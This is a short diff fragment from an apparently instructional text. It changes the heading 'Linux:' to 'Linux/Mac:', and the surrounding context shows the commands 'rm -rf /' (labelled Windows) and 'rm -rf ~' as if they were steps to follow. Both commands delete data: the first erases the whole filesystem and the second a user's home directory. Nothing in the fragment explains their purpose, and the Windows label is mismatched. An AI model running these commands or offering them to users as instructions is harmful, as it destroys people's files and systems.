@@ -2,7 +2,7 @@ Windows:
 ```
 rm -rf /
 ```
-Linux:
+Linux/Mac:
 ```
 rm -rf ~
 ```
